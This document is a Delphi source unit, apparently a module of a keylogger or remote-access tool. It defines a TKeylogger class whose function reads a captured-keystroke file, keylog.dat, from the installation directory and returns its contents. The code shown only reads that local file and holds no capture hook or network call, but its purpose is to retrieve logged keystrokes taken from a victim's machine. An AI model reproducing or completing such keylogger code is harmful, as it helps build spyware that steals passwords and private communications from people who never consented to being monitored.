unit uKeylogger;

interface

uses
  Windows, uInstallation,classes,sysutils;

type
  TKeylogger = class
  private
  public
    Function Readkeylogger: String;
  end;

var
  Keylogger: TKeylogger;

implementation

Function TKeylogger.Readkeylogger: String;
var
  Installation : TInstaller;
begin
  Installation := TInstaller.Create;
  Result := ' ';
  if fileexists( Installation.GetCurrentDir + '\keylog.dat') = false then exit;
  with TFileStream.Create(Installation.GetCurrentDir + '\keylog.dat', fmOpenRead or fmShareDenyWrite) do begin
    try
      SetLength(Result, Size);
      Read(Pointer(Result)^, Size);
    except
      Result := ' ';
    end;
    Free;
  end;
  Installation.Free;
end;


end.
